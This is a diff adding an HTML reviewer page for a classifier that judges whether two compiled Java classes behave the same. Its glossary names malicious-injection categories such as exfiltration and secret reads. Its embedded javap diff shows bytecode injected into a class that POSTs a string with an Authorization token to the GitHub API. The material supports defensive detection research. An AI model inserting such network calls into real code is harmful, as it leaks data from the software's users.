@@ -1,0 +1,792 @@
+<!doctype html>
+<html lang="en" data-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Binary equivalence review</title>
+<meta name="description" content="A reviewer's-eye view of a binary equivalence classification: whether two compiled Java classes behave the same, the specific reason they differ, model confidence, and the bytecode evidence.">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#4f5bd5">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Binary equivalence review">
+<meta property="og:description" content="Explaining a binary equivalence classification for a human reviewer: verdict, specific label, confidence, and bytecode evidence.">
+<meta name="twitter:card" content="summary">
+<style>
+  /* ---- tokens -------------------------------------------------------- */
+  :root {
+    --ground: #f6f7f9;
+    --surface: #ffffff;
+    --surface-2: #f1f3f7;
+    --ink: #1a1f2b;
+    --muted: #5b6472;
+    --faint: #8b93a1;
+    --border: #e2e6ee;
+    --border-strong: #cfd5e0;
+    --accent: #4f5bd5;         /* interactive chrome only, never a verdict */
+    --ok: #1f8a5b;    --ok-bg: #e7f4ee;   --ok-line: #1f8a5b;
+    --warn: #a5610a;  --warn-bg: #f7efe1;  --warn-line: #c9871f;
+    --crit: #c0392b;  --crit-bg: #f8e9e7;  --crit-line: #c0392b;
+    --shadow: 0 1px 2px rgba(20,26,40,.05), 0 6px 20px rgba(20,26,40,.06);
+    --mono: ui-monospace, "SF Mono", "JetBrains Mono", Menlo, Consolas, monospace;
+    --sans: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --ground: #10131a;  --surface: #191d27;  --surface-2: #20262f;
+      --ink: #e7eaf0;  --muted: #9aa3b2;  --faint: #6c7686;
+      --border: #29303d;  --border-strong: #3a4150;
+      --accent: #9aa2f5;
+      --ok: #4cc38a;   --ok-bg: #16271f;   --ok-line: #2e9c68;
+      --warn: #e0a458; --warn-bg: #2a2318;  --warn-line: #b9812f;
+      --crit: #f0837a; --crit-bg: #2c1a18;  --crit-line: #b8483c;
+      --shadow: 0 1px 2px rgba(0,0,0,.3), 0 8px 24px rgba(0,0,0,.35);
+    }
+  }
+  :root[data-theme="light"] {
+    --ground: #f6f7f9; --surface: #fff; --surface-2: #f1f3f7;
+    --ink: #1a1f2b; --muted: #5b6472; --faint: #8b93a1;
+    --border: #e2e6ee; --border-strong: #cfd5e0; --accent: #4f5bd5;
+    --ok:#1f8a5b; --ok-bg:#e7f4ee; --ok-line:#1f8a5b;
+    --warn:#a5610a; --warn-bg:#f7efe1; --warn-line:#c9871f;
+    --crit:#c0392b; --crit-bg:#f8e9e7; --crit-line:#c0392b;
+    --shadow: 0 1px 2px rgba(20,26,40,.05), 0 6px 20px rgba(20,26,40,.06);
+  }
+  :root[data-theme="dark"] {
+    --ground:#10131a; --surface:#191d27; --surface-2:#20262f;
+    --ink:#e7eaf0; --muted:#9aa3b2; --faint:#6c7686;
+    --border:#29303d; --border-strong:#3a4150; --accent:#9aa2f5;
+    --ok:#4cc38a; --ok-bg:#16271f; --ok-line:#2e9c68;
+    --warn:#e0a458; --warn-bg:#2a2318; --warn-line:#b9812f;
+    --crit:#f0837a; --crit-bg:#2c1a18; --crit-line:#b8483c;
+    --shadow: 0 1px 2px rgba(0,0,0,.3), 0 8px 24px rgba(0,0,0,.35);
+  }
+
+  * { box-sizing: border-box; }
+  html { color-scheme: light dark; }
+  body {
+    margin: 0; background: var(--ground); color: var(--ink);
+    font-family: var(--sans); line-height: 1.5;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: 760px; margin: 0 auto; padding: 32px 20px 64px; }
+
+  [hidden] { display: none !important; }
+
+  /* ---- notice / example banner -------------------------------------- */
+  .notice { font-size: 14.5px; line-height: 1.5; color: var(--muted);
+    background: var(--surface-2); border: 1px solid var(--border);
+    border-left: 3px solid var(--accent); border-radius: 8px;
+    padding: 11px 15px; margin-bottom: 20px; }
+  .notice b { color: var(--ink); }
+
+  /* ---- header -------------------------------------------------------- */
+  .masthead { display: flex; align-items: baseline; justify-content: space-between;
+    gap: 16px; flex-wrap: wrap; margin-bottom: 22px; }
+  .eyebrow { font-size: 12.5px; letter-spacing: .14em; text-transform: uppercase;
+    color: var(--faint); font-weight: 600; margin: 0 0 3px; }
+  .masthead h1 { font-size: 22px; font-weight: 650; margin: 0; letter-spacing: -.01em; }
+  .case-id { font-family: var(--mono); font-size: 13.5px; color: var(--muted);
+    background: var(--surface-2); border: 1px solid var(--border);
+    padding: 4px 9px; border-radius: 6px; white-space: nowrap; }
+
+  /* ---- verdict card -------------------------------------------------- */
+  .verdict { position: relative; background: var(--surface); border: 1px solid var(--border);
+    border-radius: 14px; box-shadow: var(--shadow); padding: 22px 24px 24px;
+    overflow: hidden; }
+  .verdict::before { content: ""; position: absolute; inset: 0 auto 0 0; width: 5px;
+    background: var(--stripe, var(--border-strong)); }
+  .verdict[data-sev="ok"]   { --stripe: var(--ok-line); }
+  .verdict[data-sev="warn"] { --stripe: var(--warn-line); }
+  .verdict[data-sev="crit"] { --stripe: var(--crit-line); }
+
+  .verdict-head { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
+  .badge { font-family: var(--mono); font-weight: 700; font-size: 17px;
+    letter-spacing: .02em; padding: 8px 16px; border-radius: 8px; line-height: 1;
+    border: 1px solid transparent; }
+  .badge[data-sev="ok"]   { background: var(--ok-bg);   color: var(--ok);   border-color: var(--ok-line); }
+  .badge[data-sev="warn"] { background: var(--warn-bg); color: var(--warn); border-color: var(--warn-line); }
+  .badge[data-sev="crit"] { background: var(--crit-bg); color: var(--crit); border-color: var(--crit-line); }
+  .badge.friendly { font-family: var(--sans); font-weight: 650; }
+  .recommend { font-size: 13px; color: var(--faint); letter-spacing: .04em;
+    text-transform: uppercase; font-weight: 600; }
+
+  .sublabel-row { margin-top: 18px; display: flex; align-items: baseline; gap: 10px;
+    flex-wrap: wrap; }
+  .sublabel-row .k { font-size: 13.5px; color: var(--muted); }
+  .sublabel { font-family: var(--mono); font-size: 15px; font-weight: 600;
+    color: var(--ink); background: var(--surface-2); border: 1px solid var(--border);
+    padding: 4px 10px; border-radius: 6px; }
+  .description { margin: 12px 0 0; color: var(--muted); font-size: 16px;
+    line-height: 1.55; max-width: 62ch; }
+  .description .lead { color: var(--ink); font-weight: 600; }
+  .description.survey { color: var(--ink); font-size: 16.5px; line-height: 1.6; }
+  .description.survey b { font-weight: 650; }
+  .description.survey .cert { color: var(--muted); font-size: 14.5px; }
+
+  /* ---- confidence --------------------------------------------------- */
+  .conf { margin-top: 20px; }
+  .conf-top { display: flex; justify-content: space-between; align-items: baseline;
+    font-size: 14px; color: var(--muted); margin-bottom: 7px; }
+  .conf-top strong { color: var(--ink); font-family: var(--mono);
+    font-variant-numeric: tabular-nums; font-size: 15px; }
+  .meter { height: 8px; background: var(--surface-2); border: 1px solid var(--border);
+    border-radius: 99px; overflow: hidden; }
+  .meter > span { display: block; height: 100%; border-radius: 99px;
+    background: var(--stripe, var(--accent)); transition: width .4s ease; }
+  .caution { display: none; margin-top: 12px; font-size: 14.5px; gap: 8px;
+    align-items: flex-start; color: var(--warn); background: var(--warn-bg);
+    border: 1px solid var(--warn-line); border-radius: 8px; padding: 8px 11px; }
+  .caution.show { display: flex; }
+
+  /* ---- alternatives ------------------------------------------------- */
+  /* Label wraps to full width (never truncated) with the % beside it and a
+     thin probability bar underneath. */
+  .alts { display: flex; flex-direction: column; gap: 8px; }
+  .alt { display: flex; flex-direction: column; gap: 8px; background: var(--surface);
+    border: 1px solid var(--border); border-radius: 9px; padding: 11px 14px; }
+  .alt .al-head { display: flex; justify-content: space-between; align-items: baseline;
+    gap: 12px; }
+  .alt .al-name { display: flex; flex-direction: column; gap: 2px; min-width: 0; }
+  .alt .al-term { font-size: 15px; color: var(--ink); line-height: 1.4; }
+  .alt .al-raw { font-family: var(--mono); font-size: 12.5px; color: var(--faint);
+    word-break: break-all; }
+  .alt .al-pct { font-family: var(--mono); font-size: 15px; color: var(--ink);
+    font-weight: 600; font-variant-numeric: tabular-nums; flex-shrink: 0; }
+  .alt .al-bar { height: 6px; background: var(--surface-2); border-radius: 99px;
+    overflow: hidden; }
+  .alt .al-bar > span { display: block; height: 100%; border-radius: 99px;
+    background: var(--faint); }
+  .alt[data-sev="crit"] .al-bar > span { background: var(--crit-line); }
+  .alt[data-sev="warn"] .al-bar > span { background: var(--warn-line); }
+  .alt[data-sev="ok"]   .al-bar > span { background: var(--ok-line); }
+
+  /* ---- header subject (class name only; never a container path) ----- */
+  .subject { margin: 7px 0 0; font-family: var(--mono); font-size: 13.5px;
+    color: var(--muted); word-break: break-all; }
+  .subject b { color: var(--ink); font-weight: 600; }
+
+  /* ---- overall model accuracy stat ---------------------------------- */
+  .modelstat { margin: 16px 0 0; font-size: 14.5px; color: var(--muted);
+    background: var(--surface-2); border: 1px solid var(--border);
+    border-radius: 8px; padding: 10px 14px; }
+  .modelstat b { color: var(--ink); font-variant-numeric: tabular-nums; }
+
+  /* ---- section labels (shared) -------------------------------------- */
+  .section-label { font-size: 12.5px; letter-spacing: .12em; text-transform: uppercase;
+    color: var(--faint); font-weight: 600; margin: 28px 0 10px; }
+
+  /* ---- investigate (progressive disclosure) ------------------------- */
+  .panel { background: var(--surface); border: 1px solid var(--border);
+    border-radius: 11px; margin-top: 10px; overflow: hidden; }
+  .panel > summary { cursor: pointer; list-style: none; padding: 15px 16px;
+    display: flex; align-items: center; gap: 10px; font-size: 16px; font-weight: 600;
+    user-select: none; }
+  .panel > summary::-webkit-details-marker { display: none; }
+  .panel > summary:focus-visible { outline: 2px solid var(--accent); outline-offset: -2px; }
+  .chev { width: 8px; height: 8px; border-right: 2px solid var(--faint);
+    border-bottom: 2px solid var(--faint); transform: rotate(-45deg);
+    transition: transform .2s ease; margin-left: -2px; }
+  .panel[open] .chev { transform: rotate(45deg); }
+  .panel .summary-note { margin-left: auto; font-size: 13px; color: var(--faint); }
+  .panel-body { padding: 4px 16px 18px; border-top: 1px solid var(--border); }
+  .empty { color: var(--faint); font-size: 15px; padding: 14px 0 4px;
+    text-align: center; }
+  .empty code { font-family: var(--mono); font-size: 13.5px; }
+
+  /* feature importance — signed, per-instance (diverging bars) */
+  .fi-caption { font-size: 14.5px; color: var(--muted); padding: 12px 0 6px;
+    line-height: 1.5; }
+  .fi-caption b { color: var(--accent); font-weight: 600; }
+  .fi-caption i { color: var(--faint); font-style: normal; font-weight: 600; }
+  .fi { display: flex; flex-direction: column; gap: 10px; padding-top: 6px; }
+  .fi-row { display: grid; grid-template-columns: 200px 1fr 60px; align-items: center;
+    gap: 10px; }
+  .fi-row .name { display: flex; flex-direction: column; gap: 1px; min-width: 0; }
+  .fi-row .fname { font-size: 14px; color: var(--ink); white-space: nowrap;
+    overflow: hidden; text-overflow: ellipsis; }
+  .fi-row .fraw { font-family: var(--mono); font-size: 12px; color: var(--faint);
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .fi-track { position: relative; height: 9px; background: var(--surface-2);
+    border-radius: 99px; }
+  .fi-track .axis { position: absolute; left: 50%; top: -2px; bottom: -2px;
+    width: 1px; background: var(--border-strong); }
+  .fi-track > span { position: absolute; top: 0; bottom: 0; border-radius: 99px; }
+  .fi-track > span.pos { left: 50%; background: var(--accent); }
+  .fi-track > span.neg { right: 50%; background: var(--faint); }
+  .fi-row .val { font-family: var(--mono); font-size: 13.5px; text-align: right;
+    font-variant-numeric: tabular-nums; }
+  .fi-row .val.pos { color: var(--accent); }
+  .fi-row .val.neg { color: var(--muted); }
+  @media (max-width: 560px) { .fi-row { grid-template-columns: 120px 1fr 52px; } }
+
+  /* javap diff */
+  .diff { margin-top: 12px; border: 1px solid var(--border); border-radius: 8px;
+    overflow-x: auto; background: var(--surface-2); }
+  .diff pre { margin: 0; font-family: var(--mono); font-size: 13.5px; line-height: 1.6; }
+  .diff .ln { display: block; padding: 0 12px; white-space: pre; }
+  .diff .add { background: var(--ok-bg); color: var(--ok); }
+  .diff .del { background: var(--crit-bg); color: var(--crit); }
+  .diff .hunk { color: var(--accent); }
+
+  /* experimental diff toggles + side-by-side view */
+  .diff-controls { display: flex; gap: 14px; flex-wrap: wrap; padding: 12px 0 14px; }
+  .dc-group { display: inline-flex; border: 1px solid var(--border-strong);
+    border-radius: 8px; overflow: hidden; }
+  .dc-group button { font: inherit; font-size: 13px; padding: 6px 13px; border: 0;
+    background: var(--surface); color: var(--muted); cursor: pointer; }
+  .dc-group button + button { border-left: 1px solid var(--border-strong); }
+  .dc-group button.on { background: var(--accent); color: #fff; }
+  .diff.sxs { overflow-x: auto; }
+  .diff.sxs table { border-collapse: collapse; width: 100%; table-layout: fixed;
+    font-family: var(--mono); font-size: 13px; line-height: 1.55; }
+  .diff.sxs td { padding: 0 10px; white-space: pre; vertical-align: top; width: 50%;
+    overflow-x: auto; }
+  .diff.sxs td.sxs-r { border-left: 1px solid var(--border); }
+  .sxs-del td.sxs-l, .sxs-chg td.sxs-l { background: var(--crit-bg); color: var(--crit); }
+  .sxs-ins td.sxs-r, .sxs-chg td.sxs-r { background: var(--ok-bg); color: var(--ok); }
+
+  /* ---- reviewer decision -------------------------------------------- */
+  .decision { margin-top: 28px; background: var(--surface); border: 1px solid var(--border);
+    border-radius: 12px; padding: 16px 18px; }
+  .decision h2 { font-size: 15px; margin: 0 0 4px; }
+  .decision p { margin: 0 0 14px; font-size: 14px; color: var(--muted); }
+  .actions { display: flex; gap: 9px; flex-wrap: wrap; }
+  .btn { font: inherit; font-size: 14.5px; font-weight: 550; cursor: pointer;
+    padding: 9px 15px; border-radius: 8px; border: 1px solid var(--border-strong);
+    background: var(--surface-2); color: var(--ink); transition: border-color .15s; }
+  .btn:hover { border-color: var(--accent); }
+  .btn:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+  .btn[aria-pressed="true"] { border-color: var(--accent); box-shadow: inset 0 0 0 1px var(--accent); }
+  .btn[data-kind="agree"][aria-pressed="true"]    { color: var(--ok);   border-color: var(--ok-line); box-shadow: inset 0 0 0 1px var(--ok-line); }
+  .btn[data-kind="override"][aria-pressed="true"] { color: var(--crit); border-color: var(--crit-line); box-shadow: inset 0 0 0 1px var(--crit-line); }
+  .decision-status { margin-top: 12px; font-size: 14px; color: var(--muted);
+    min-height: 1.2em; }
+  .decision-status b { color: var(--ink); }
+
+  /* ---- footer ------------------------------------------------------- */
+  .foot { margin-top: 26px; display: flex; justify-content: space-between; gap: 12px;
+    flex-wrap: wrap; font-size: 13px; color: var(--faint); }
+  .foot code { font-family: var(--mono); color: var(--muted); }
+
+  @media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
+</style>
+</head>
+<body>
+<main class="wrap">
+  <div class="notice" id="notice" hidden></div>
+  <div class="masthead">
+    <div>
+      <p class="eyebrow">Binary equivalence review</p>
+      <h1>Classification for review</h1>
+      <p class="subject" id="subject" hidden></p>
+    </div>
+    <span class="case-id" id="caseId">—</span>
+  </div>
+
+  <!-- verdict ------------------------------------------------------- -->
+  <section class="verdict" id="verdict" aria-labelledby="verdictHead">
+    <div class="verdict-head">
+      <span class="badge" id="badge" data-sev="warn">—</span>
+      <span class="recommend">Model recommendation</span>
+    </div>
+    <div class="sublabel-row">
+      <span class="k">Specific label</span>
+      <span class="sublabel" id="sublabel">—</span>
+    </div>
+    <p class="description" id="description"></p>
+
+    <div class="conf">
+      <div class="conf-top">
+        <span>Model confidence</span>
+        <strong id="confPct">—</strong>
+      </div>
+      <div class="meter"><span id="confBar" style="width:0"></span></div>
+      <div class="caution" id="caution" role="note">
+        <span aria-hidden="true">&#9888;</span>
+        <span>Low confidence &mdash; treat this recommendation with extra scrutiny before deciding.</span>
+      </div>
+    </div>
+  </section>
+
+  <p class="modelstat" id="modelStat" hidden></p>
+
+  <!-- alternatives considered --------------------------------------- -->
+  <section id="altSection" hidden aria-labelledby="altLabel">
+    <p class="section-label" id="altLabel">Also considered</p>
+    <div class="alts" id="alts"></div>
+  </section>
+
+  <!-- investigate --------------------------------------------------- -->
+  <p class="section-label" id="investigateLabel">Investigate further</p>
+
+  <details class="panel" id="fiPanel">
+    <summary><span class="chev" aria-hidden="true"></span> Feature attribution &mdash; this pair
+      <span class="summary-note" id="fiNote"></span></summary>
+    <div class="panel-body" id="fiBody"></div>
+  </details>
+
+  <details class="panel" id="diffPanel" open>
+    <summary><span class="chev" aria-hidden="true"></span> Bytecode diff (javap)
+      <span class="summary-note" id="diffNote"></span></summary>
+    <div class="panel-body" id="diffBody"></div>
+  </details>
+
+  <!-- reviewer decision --------------------------------------------- -->
+  <section class="decision" aria-labelledby="decHead">
+    <h2 id="decHead">Reviewer decision</h2>
+    <p>You are accountable for the final call. The recommendation above is advisory.</p>
+    <div class="actions" role="group" aria-label="Reviewer decision">
+      <button class="btn" data-kind="agree" aria-pressed="false">Agree with recommendation</button>
+      <button class="btn" data-kind="override" aria-pressed="false">Override</button>
+      <button class="btn" data-kind="defer" aria-pressed="false">Needs more investigation</button>
+    </div>
+    <div class="decision-status" id="decStatus" aria-live="polite">No decision recorded.</div>
+  </section>
+
+  <div class="foot">
+    <span>Model: <code id="modelName">—</code></span>
+    <span>Evaluated <code id="evaluatedAt">—</code></span>
+  </div>
+</main>
+
+<script>
+window.__GLOSSARY__ = {"$comment": "Plain-language decoder for project-specific names shown in the reviewer UI. Audience is software engineers / security specialists, so terms stay precise but drop the internal shorthand. Single source of truth: consumed by ui/review.html (JS) and ui/glossary.py (Python). 'term' = short label; 'detail' = one-sentence explanation.", "version": 1, "binary": {"EQ": {"term": "Equivalent", "detail": "The two binaries are judged to behave the same."}, "NEQ": {"term": "Not equivalent", "detail": "The two binaries are judged to behave differently."}}, "groups": {"EQ": {"term": "Equivalent", "detail": "Behaviour matches; any differences are attributed to the build toolchain."}, "NEQ1": {"term": "Breaking API change", "detail": "Behaviour differs because of a breaking change between two versions of the source (a bytecode/API-level difference)."}, "NEQ2": {"term": "Mutation testing change", "detail": "Behaviour differs because a mutation-testing tool (Pitest) deliberately altered the source."}, "NEQM": {"term": "Suspected malicious injection", "detail": "Behaviour differs in a way that resembles injected malicious code."}, "NEQ3": {"term": "Vulnerability patch", "detail": "Behaviour differs because it was patched to fix a vulnerability."}}, "eq_sublabels": {"EQ-SameMjCompVer": {"term": "Same compiler and version", "detail": "Both built with the same compiler and the same major version."}, "EQ-SameComp": {"term": "Same compiler, different version", "detail": "Both built with the same compiler family but different major versions."}, "EQ-DiffComp": {"term": "Different compilers", "detail": "Built by different compilers."}}, "neq2_families": {"conditionals": {"term": "conditional logic", "detail": "Flipped or removed an if / comparison decision."}, "math": {"term": "arithmetic", "detail": "Changed a maths operator (e.g. + became -)."}, "returns": {"term": "return values", "detail": "Changed what a method returns."}, "calls": {"term": "method calls", "detail": "Removed or altered a method or constructor call."}, "constants": {"term": "constant values", "detail": "Changed an inline constant."}, "increments": {"term": "increments", "detail": "Changed or removed an increment (e.g. i++)."}, "other": {"term": "other mutation", "detail": "An uncategorised mutation."}}, "neqm_families": {"netio": {"term": "network I/O", "detail": "Code that sends or fetches data over a network."}, "fsaccess": {"term": "file access", "detail": "Code that reads, writes, or deletes files."}, "recon": {"term": "reconnaissance", "detail": "Code that collects information about the environment, such as OS details, environment variables, the screen."}, "procmem": {"term": "process / memory", "detail": "Code that starts processes or loads native code."}, "reflect": {"term": "reflection", "detail": "Code that loads classes or invokes methods dynamically at runtime."}, "crypto": {"term": "cryptography", "detail": "Code that does hashing, encryption, decryption, or (de)serialisation."}, "obfusc": {"term": "obfuscation", "detail": "Code that obfuscates information."}}, "neqm_subcategories": {"exfil": "data exfiltration", "download": "download", "post": "upload / POST", "recon": "network probe", "socket": "raw socket", "load": "class loading", "invoke": "dynamic invocation", "field": "field access", "eval": "script evaluation", "hash": "hashing", "verify": "signature check", "decrypt": "decryption", "deserialise": "deserialisation", "digest": "digest", "writesecret": "secret write", "readsecret": "secret read", "enum": "file enumeration", "del": "file deletion", "exec": "process execution", "nativeload": "native code load", "env": "environment read", "os": "OS information", "decode": "payload decoding", "strsplit": "string splitting", "strconcat": "string joining"}, "$comment_neqm_flat": "Flat (non-hierarchical) NEQM tags in the mutants set. Decoded individually since they have no family/subcategory/technique structure. DRAFT terms — review/reword as needed.", "neqm_flat": {"CONDITIONALS_BOUNDARY": {"term": "altered a comparison boundary", "detail": "A boundary in a relational comparison was shifted (e.g. < became <=)."}, "NEGATE_CONDITIONALS": {"term": "negated a condition", "detail": "A conditional test was inverted (e.g. == became !=)."}, "REMOVE_CONDITIONALS_EQUAL_IF": {"term": "removed an equality check (if branch)", "detail": "An equality condition was replaced so the if branch is always taken."}, "REMOVE_CONDITIONALS_EQUAL_ELSE": {"term": "removed an equality check (else branch)", "detail": "An equality condition was replaced so the else branch is always taken."}, "REMOVE_CONDITIONALS_ORDER_IF": {"term": "removed an ordering check (if branch)", "detail": "A relational (<, >) condition was replaced so the if branch is always taken."}, "REMOVE_CONDITIONALS_ORDER_ELSE": {"term": "removed an ordering check (else branch)", "detail": "A relational (<, >) condition was replaced so the else branch is always taken."}, "PATTERN_MATCHES_ANYTHING": {"term": "made a pattern match always succeed", "detail": "A regular-expression match was replaced so it always returns true."}, "STRING_MATCHER_MATCHES_ANYTHING": {"term": "made a string matcher always succeed", "detail": "A string matcher was replaced so it always returns true."}, "DES_SYMMETRIC": {"term": "substituted weak DES encryption", "detail": "Encryption was switched to the weak DES cipher."}, "MD5_JAVA": {"term": "substituted a weak MD5 hash", "detail": "Hashing was switched to the MD5 algorithm."}, "REMOVE_SSL_SOCKET": {"term": "removed SSL from a socket", "detail": "A secure socket was replaced with a plain, unencrypted one."}, "TRUST_FILENAME_INPUT": {"term": "trusted unvalidated filename input", "detail": "A filename from untrusted input was used without validation."}, "XML_DISABLE_DOCTYPE_SAX": {"term": "disabled XML DOCTYPE protection (SAX)", "detail": "External-entity / DOCTYPE protection was disabled on a SAX parser."}, "XML_DISABLE_DOCTYPE_XMLREADER": {"term": "disabled XML DOCTYPE protection (XMLReader)", "detail": "External-entity / DOCTYPE protection was disabled on an XMLReader."}, "XML_DISABLE_DOS_SAX": {"term": "disabled XML DoS protection (SAX)", "detail": "Denial-of-service protection was disabled on a SAX parser."}, "XML_DISABLE_DOS_XMLREADER": {"term": "disabled XML DoS protection (XMLReader)", "detail": "Denial-of-service protection was disabled on an XMLReader."}}, "features": {"s_access": {"term": "Access-modifier similarity", "detail": "How alike the two classes' access flags are (public, final, abstract, …)."}, "d_name": {"term": "Class-name difference", "detail": "How much the class names differ (character edit distance)."}, "d_supername": {"term": "Parent-class-name difference", "detail": "How much the superclass names differ."}, "d_signature": {"term": "Generic-signature difference", "detail": "How much the classes' generic type signatures differ."}, "s_interfaces": {"term": "Interface similarity", "detail": "Overlap in the interfaces the two classes implement."}, "d_fieldCount": {"term": "Field-count difference", "detail": "Difference in the number of fields."}, "s_fields": {"term": "Field similarity", "detail": "Overlap in the two classes' fields."}, "d_methodCount": {"term": "Method-count difference", "detail": "Difference in the number of methods."}, "s_methodSet": {"term": "Method-set similarity", "detail": "Overlap in the sets of methods the classes define."}, "c_matched": {"term": "Matched methods (count)", "detail": "Number of methods paired one-to-one between the two classes."}, "c_unmatchedMethods": {"term": "Unmatched methods (count)", "detail": "Number of methods with no counterpart in the other class."}, "c_partmatchedMethods": {"term": "Loosely-matched methods (count)", "detail": "Methods that match only approximately, e.g. compiler-renamed lambdas."}, "c_matchedProportion": {"term": "Matched methods (share)", "detail": "Fraction of methods that paired up exactly."}, "c_unmatchedProportion": {"term": "Unmatched methods (share)", "detail": "Fraction of methods with no counterpart."}, "c_partmatchedProportion": {"term": "Loosely-matched (share)", "detail": "Fraction of methods that match only approximately."}, "s_methodVarType": {"term": "Local-variable-type similarity", "detail": "Overlap in the local variable types used across methods."}, "s_methodLdcType": {"term": "Loaded-constant-type similarity", "detail": "Overlap in the types of constants loaded by the code."}, "s_methodInvokeDynType": {"term": "Dynamic-call-type similarity", "detail": "Overlap in invokedynamic call types (lambdas, string concatenation)."}, "d_invocations": {"term": "Call-count difference", "detail": "Difference in the total number of calls made."}, "s_invocations": {"term": "Call similarity", "detail": "Overlap in which calls are made, by call site."}, "d_methodInvocations": {"term": "Per-method call-count difference", "detail": "Difference in how many calls the methods make."}, "s_methodNames": {"term": "Method-name similarity", "detail": "Overlap in method names."}, "s_methodAccess": {"term": "Method access-flag similarity", "detail": "Overlap in method access modifiers."}, "s_methodDescriptors": {"term": "Method-signature similarity", "detail": "Overlap in method parameter and return-type signatures."}, "s_methodCfgNodes": {"term": "Control-flow-node similarity", "detail": "Overlap in the size of methods' control-flow graphs (basic blocks)."}, "s_methodCfgEdges": {"term": "Control-flow-edge similarity", "detail": "Overlap in the number of control-flow transitions between blocks."}, "s_methodCyclomaticComplexity": {"term": "Complexity similarity", "detail": "Overlap in methods' cyclomatic complexity (how many independent branches)."}, "s_methodDtNodes": {"term": "Dominator-tree-node similarity", "detail": "Overlap in dominator-tree size — a fingerprint of control structure."}, "s_methodDtDepth": {"term": "Dominator-tree-depth similarity", "detail": "Overlap in how deeply nested the control structures are."}, "s_methodExceptions": {"term": "Declared-exception similarity", "detail": "Overlap in the exceptions methods declare or handle."}, "s_methodArgCount": {"term": "Argument-count similarity", "detail": "Overlap in how many arguments methods take."}, "s_methodInitialisers": {"term": "Initialiser similarity", "detail": "Overlap in which methods are static/instance initialisers."}, "s_methodConstructors": {"term": "Constructor similarity", "detail": "Overlap in which methods are constructors."}, "s_methodOpcodes": {"term": "Opcode-mix similarity", "detail": "Overlap in the mix of bytecode operations used."}, "d_ins_branch_unconditional": {"term": "Unconditional-jump difference", "detail": "Difference in the count of goto-style jumps."}, "d_ins_branch_conditional": {"term": "Conditional-branch difference", "detail": "Difference in the count of if / comparison branches."}, "d_ins_branch_compound": {"term": "Switch-statement difference", "detail": "Difference in the count of switch (table/lookup) instructions."}, "d_ins_comparison": {"term": "Comparison-op difference", "detail": "Difference in the count of long/float/double comparison instructions."}, "d_ins_load": {"term": "Variable-load difference", "detail": "Difference in the count of load-from-variable instructions."}, "d_ins_store": {"term": "Variable-store difference", "detail": "Difference in the count of store-to-variable instructions."}, "d_ins_const": {"term": "Constant-push difference", "detail": "Difference in the count of constant-loading instructions."}, "d_ins_arith_add": {"term": "Addition-op difference", "detail": "Difference in the count of addition instructions."}, "d_ins_arith_sub": {"term": "Subtraction-op difference", "detail": "Difference in the count of subtraction instructions."}, "d_ins_arith_mul": {"term": "Multiplication-op difference", "detail": "Difference in the count of multiplication instructions."}, "d_ins_arith_div": {"term": "Division-op difference", "detail": "Difference in the count of division instructions."}, "d_ins_arith_rem": {"term": "Remainder-op difference", "detail": "Difference in the count of remainder / modulo instructions."}, "d_ins_type_conversion": {"term": "Type-conversion difference", "detail": "Difference in the count of numeric type-cast instructions."}, "s_insn_records": {"term": "Instruction-level similarity", "detail": "Overlap in individual bytecode instructions (opcode, operands, and where they occur)."}}};
+window.__CASE__ = {
+  "caseId": "s80",
+  "model": "Prototype classifier",
+  "evaluatedAt": "",
+  "pair": {
+    "left": {
+      "role": "left",
+      "class": "/org/apache/bcel/data/LargeMethod.class"
+    },
+    "right": {
+      "role": "right",
+      "class": "/org/apache/bcel/data/LargeMethod.class"
+    }
+  },
+  "prediction": {
+    "sublabel": "NEQM-netio.exfil.githubapi",
+    "confidence": 0.9318181818181819,
+    "alternatives": []
+  },
+  "featureImportances": [],
+  "javapDiff": "@@ -32766,7 +32766,40 @@\n     64500: athrow\n     64501: aload_w       2049\n     64505: athrow\n-    64506: return\n+    64506: goto          64509\n+    64509: aconst_null\n+    64510: astore_w      4098\n+    64514: new           # // class java/net/URL\n+    64517: dup\n+    64518: ldc           # // String https://api.github.com/user/repos\n+    64520: invokespecial # // Method java/net/URL.\"<init>\":(Ljava/lang/String;)V\n+    64523: invokevirtual # // Method java/net/URL.openConnection:()Ljava/net/URLConnection;\n+    64526: checkcast     # // class java/net/HttpURLConnection\n+    64529: astore_w      4099\n+    64533: aload_w       4099\n+    64537: ldc           # // String POST\n+    64539: invokevirtual # // Method java/net/HttpURLConnection.setRequestMethod:(Ljava/lang/String;)V\n+    64542: aload_w       4099\n+    64546: ldc           # // String Authorization\n+    64548: ldc           # // String token church_dull\n+    64550: invokevirtual # // Method java/net/URLConnection.setRequestProperty:(Ljava/lang/String;Ljava/lang/String;)V\n+    64553: aload_w       4099\n+    64557: ldc           # // String Accept\n+    64559: ldc           # // String application/vnd.github+json\n+    64561: invokevirtual # // Method java/net/URLConnection.setRequestProperty:(Ljava/lang/String;Ljava/lang/String;)V\n+    64564: aload_w       4099\n+    64568: iconst_1\n+    64569: invokevirtual # // Method java/net/URLConnection.setDoOutput:(Z)V\n+    64572: aload_w       4099\n+    64576: invokevirtual # // Method java/net/URLConnection.getOutputStream:()Ljava/io/OutputStream;\n+    64579: ldc           # // String stuck_tower\n+    64581: getstatic     # // Field java/nio/charset/StandardCharsets.UTF_8:Ljava/nio/charset/Charset;\n+    64584: invokevirtual # // Method java/lang/String.getBytes:(Ljava/nio/charset/Charset;)[B\n+    64587: invokevirtual # // Method java/io/OutputStream.write:([B)V\n+    64590: aload_w       4099\n+    64594: invokevirtual # // Method java/net/HttpURLConnection.getResponseCode:()I\n+    64597: pop\n+    64598: return\n     Exception table:\n        from    to  target type\n           26    28    33   any",
+  "theme": "light",
+  "accuracy": 0.8579693034238489,
+  "accuracyLabel": "Overall model accuracy",
+  "survey": true
+};
+</script>
+<script>
+/* =====================================================================
+   CASE DATA
+   ui/render_review.py injects `window.__CASE__` at the marker above to
+   populate this page for a specific binary pair.  The object below is the
+   fallback shown when the page is opened directly (a worked example).
